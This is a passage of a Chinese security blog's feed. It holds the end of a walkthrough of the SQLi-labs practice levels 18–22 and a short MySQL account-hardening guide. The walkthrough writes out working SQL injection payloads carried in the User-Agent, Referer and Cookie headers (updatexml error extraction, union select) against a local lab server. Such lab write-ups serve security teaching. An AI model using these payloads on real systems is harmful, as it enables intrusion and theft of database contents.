href="#Less-18-User-Agent注入" class="headerlink" title="Less-18 User-Agent注入"></a>Less-18 User-Agent注入</h3><blockquote><ul><li>HOSt:指定被请求资源的Internet主机和端口号</li><li>User-Agent:允许客户端将它的操作系统、浏览器和其他属性告诉服务器</li><li>Referer:包含一个URL,从哪个页面访问的</li><li>Cookie：告诉服务器你是谁</li></ul></blockquote><p><img src="https://i.loli.net/2019/04/01/5ca1c24c10fbd.png" alt="21.png"><br>出现这个是不是很奇怪啊<br>啥<code>&#39;、&quot;、)</code>都不行<br>注：在这里笔者困扰了好久，发现在上一关密码被我修改了，打脑壳啊！<br><img src="https://i.loli.net/2019/04/01/5ca1d435f096e.png" alt="22.png"><br>登录成功后将显示User-Agent<br><img src="https://i.loli.net/2019/04/01/5ca1d495c5401.png" alt="23.png"><br>输入<code>&#39;</code>报错<br><img src="https://i.loli.net/2019/04/01/5ca1dacadfef2.png" alt="24.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&apos; and updatexml(1,concat(0x7c,(select database()),0x7c),1),1)#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1db4305fa3.png" alt="25.png"></p><h3 id="Less-19-Referer注入"><a href="#Less-19-Referer注入" class="headerlink" title="Less-19 Referer注入"></a>Less-19 Referer注入</h3><p>成功登录,出现URL<br><img src="https://i.loli.net/2019/04/01/5ca1dbbd26cd2.png" alt="26.png"><br>十有八九是Referer注入<br>输入<code>&#39;</code>报错<br><img src="https://i.loli.net/2019/04/01/5ca1de92e01c7.png" alt="27.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.1.101/sql/Less-19/&apos; and updatexml(1,concat(0x7c,(select database()),0x7c),1),1)#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1df31a585b.png" alt="28.png"></p><h3 id="Less-20-COOKIE注入"><a href="#Less-20-COOKIE注入" class="headerlink" title="Less-20 COOKIE注入"></a>Less-20 COOKIE注入</h3><p><img src="https://i.loli.net/2019/04/01/5ca1dfc5e78a4.png" alt="29.png"><br>这个提示要不要太明显了(<em>/ω＼</em>)<br>单引号报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&apos; and updatexml(1,concat(0x7c,(select database()),0x7c),1) --+</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1e68ef1499.png" alt="30.png"></p><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>登录上去抓包分析 <code>Cookie: uname=YWRtaW4%3D</code>COOKIE是关于BASE64<br><img src="https://i.loli.net/2019/04/01/5ca1ee2e0e198.png" alt="31.png"><br>代码分析验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee); </span><br><span class="line">echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=(&apos;$cookee&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1f1f051b23.png" alt="32.png"><br>和Less-1一样直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) and 1=2 union select 1,2,database() #</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1f5c7540d0.png" alt="33.png"><br><img src="https://i.loli.net/2019/04/01/5ca1f6039ae80.png" alt="34.png"></p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>和Less-21一样的配方一样的操作<br>双引号报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; and 1=2 union select 1,2,database() #</span><br></pre></td></tr></table></figure></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/03/28/5c9c14f01c720.jpg" alt="12783396467030DEB601EFA0174824B530CA481688.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SQLS-libs闯关测试（基础版）&quot;&gt;&lt;a href=&quot;#SQLS-libs闯关测试（基础版）&quot; class=&quot;headerlink&quot; title=&quot;SQLS-libs闯关测试（基础版）&quot;&gt;&lt;/a&gt;SQLS-libs闯关测试（基础版）&lt;/h2&gt;&lt;h3 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h3&gt;&lt;p&gt;根据提示输入id&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://localhost/sql/Less-1/?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Sql注入" scheme="http://www.lanbainan.cn/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Mysql加固</title>
    <link href="http://www.lanbainan.cn/2019/03/26/2019-3-26/"/>
    <id>http://www.lanbainan.cn/2019/03/26/2019-3-26/</id>
    <published>2019-03-25T16:00:00.000Z</published>
    <updated>2019-04-08T02:01:02.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mysql加固"><a href="#Mysql加固" class="headerlink" title="Mysql加固"></a>Mysql加固</h2><p>掌握为Mysql数据库设置用户及账户权限来保证Mysql 数据库的安全。</p><h3 id="user表"><a href="#user表" class="headerlink" title="user表"></a>user表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">SELECT Host,User,Password,Select_priv,Grant_priv FROM mysql.user;</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="https://i.loli.net/2019/03/26/5c99c303ea217.png" alt="1.png"><br>将MySQL数据库root用户的口令改为更复杂的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update user set password=password(&apos;lanbainan.cn&apos;) where user=&apos;root&apos;;</span><br><span class="line">flush privileges; #强制刷新内存授权表，否则用的还是缓冲中的口令，这时非法用户还可以用root用户及空口令登录，直到重启MySQL服务器。</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/26/5c99c49d66991.png" alt="2.png"><br>删除空用户。Host字段为localhost的匿名用户拥有所有的权限，就是说本地用户用空的用户名和空的口令登录MySQL数据库服务器可以得到最高的权限，所以匿名用户必须删除。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from user where user=&apos;&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/26/5c99c5e0d6bb6.png" alt="3.png"></p><h3 id="Desc-User"><a href="#Desc-User" class="headerlink" title="Desc User"></a>Desc User</h3><p><code>desc user</code><br>可以列出连接服务器的用户及其加密口令，并且它指定它们有哪种全局(超级用户)权限。不能给任何用户访问MySQL. User表的权限。<br><img src="https://i.loli.net/2019/03/26/5c99c7d5205bc.png" alt="4.png"></p><h3 id="Desc-DB"><a href="#Desc-DB" class="headerlink" title="Desc DB"></a>Desc DB</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">desc db</span><br></pre></td></tr></table></figure><p>列出所有数据库，而用户有权限访问它们<br><img src="https://i.loli.net/2019/03/26/5c99c8729d788.png" alt="5.png"></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Mysql加固&quot;&gt;&lt;a href=&quot;#Mysql加固&quot; class=&quot;headerlink&quot; title=&quot;Mysql加固&quot;&gt;&lt;/a&gt;Mysql加固&lt;/h2&gt;&lt;p&gt;掌握为Mysql数据库设置用户及账户权限来保证Mysql 数据库的安全。&lt;/p&gt;
&lt;h3 id=&quot;user表&quot;&gt;&lt;a href=&quot;#user表&quot; class=&quot;headerlink&quot; title=&quot;user表&quot;&gt;&lt;/a&gt;user表&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;use mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SELECT Host,User,Password,Select_priv,Grant_priv FROM mysql.user;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
